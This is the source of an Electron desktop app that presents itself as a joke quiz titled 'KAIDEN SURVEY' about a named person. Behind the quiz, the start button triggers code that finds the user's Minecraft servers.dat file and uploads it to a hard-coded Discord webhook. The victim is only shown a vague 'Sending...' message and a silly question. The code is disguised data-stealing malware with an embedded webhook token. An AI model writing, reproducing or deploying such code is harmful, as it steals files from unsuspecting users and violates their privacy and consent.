// serverviewer.js
const { app, BrowserWindow, ipcMain } = require("electron");
const path = require("path");
const fs = require("fs");
const os = require("os");
const fetch = require("node-fetch");
const FormData = require("form-data");

// ---- YOUR WEBHOOK ----
const WEBHOOK_URL = "https://discord.com/api/webhooks/1440548107346776094/YW1LjenrzkcH-Eqiwh6Dx5woXTRiVCzLxa90DPDG6i-f0hvFzRkWh-F2LQRtljkaslig";

let mainWindow;

// -------------------------------------------------------------
// Create Window
// -------------------------------------------------------------
function createWindow() {
    mainWindow = new BrowserWindow({
        width: 700,
        height: 420,
        resizable: false,
        title: "KAIDEN SURVEY",
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    // Full UI with animations
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="UTF-8">
    <title>KAIDEN SURVEY</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e1e2f, #292942);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            user-select: none;
        }

        h1 {
            font-size: 36px;
            margin-bottom: 8px;
            animation: fadeIn 0.6s ease;
        }

        p {
            font-size: 18px;
            opacity: 0.85;
            margin-bottom: 25px;
            animation: fadeIn 1s ease;
        }

        button {
            background: #5865F2;
            border: none;
            padding: 15px 40px;
            border-radius: 15px;
            font-size: 20px;
            color: white;
            cursor: pointer;
            transition: 0.25s ease;
            margin: 10px 0;
            box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.4);
            animation: fadeInUp 0.7s ease;
        }

        button:hover {
            transform: scale(1.07);
            background: #4752C4;
            box-shadow: 0px 0px 18px #4752C4;
        }

        button:active {
            transform: scale(0.93);
            filter: brightness(1.3);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

    </style>
    </head>
    <body>

    <h1>KAIDEN SURVEY</h1>
    <p>Click to begin:</p>
    <button id="startBtn">How well do you REALLY know him?</button>

    <script>
        const { ipcRenderer } = require("electron");

        const startBtn = document.getElementById("startBtn");

        // Start button
        startBtn.onclick = async () => {
            startBtn.disabled = true;
            startBtn.innerText = "Sending...";

            const result = await ipcRenderer.invoke("send-servers");

            alert(result.ok ? "Success!" : "Error: " + result.msg);

            showQuestionOne();
        };

        // ------------ QUESTION 1 ------------
        function showQuestionOne() {
            document.body.innerHTML = \`
                <h1>Question 1</h1>
                <p>Does Kadon wear skinny jeans all the time?</p>

                <button onclick="alert('Correct!')">A: No</button>
                <button onclick="alert('Incorrect!')">B: Yes</button>
                <button onclick="alert('Incorrect!')">C: Trick Question</button>
            \`;
        }
    </script>

    </body>
    </html>
    `;

    const tempPath = path.join(app.getPath("userData"), "ui.html");
    fs.writeFileSync(tempPath, html);
    mainWindow.loadFile(tempPath);
    mainWindow.setMenuBarVisibility(false);
}

// -------------------------------------------------------------
// Find servers.dat
// -------------------------------------------------------------
function getServersDatPath() {
    const home = os.homedir();

    if (os.platform() === "win32")
        return path.join(home, "AppData", "Roaming", ".minecraft", "servers.dat");

    if (os.platform() === "darwin")
        return path.join(home, "Library", "Application Support", "minecraft", "servers.dat");

    return null;
}

// -------------------------------------------------------------
// Upload servers.dat to webhook
// -------------------------------------------------------------
async function uploadFile(filePath) {
    if (!WEBHOOK_URL) return { ok: false, msg: "No webhook set" };
    if (!filePath || !fs.existsSync(filePath))
        return { ok: false, msg: "servers.dat not found" };

    try {
        const form = new FormData();
        form.append("file", fs.createReadStream(filePath));

        const res = await fetch(WEBHOOK_URL, {
            method: "POST",
            body: form
        });

        return { ok: res.ok, msg: res.statusText };
    } catch (err) {
        return { ok: false, msg: "Upload failed" };
    }
}

// IPC handler
ipcMain.handle("send-servers", async () => {
    const filePath = getServersDatPath();
    return uploadFile(filePath);
});

// -------------------------------------------------------------
// App lifecycle
// -------------------------------------------------------------
app.whenReady().then(createWindow);
app.on("window-all-closed", () => {
    if (process.platform !== "darwin") app.quit();
});
app.on("activate", () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
});
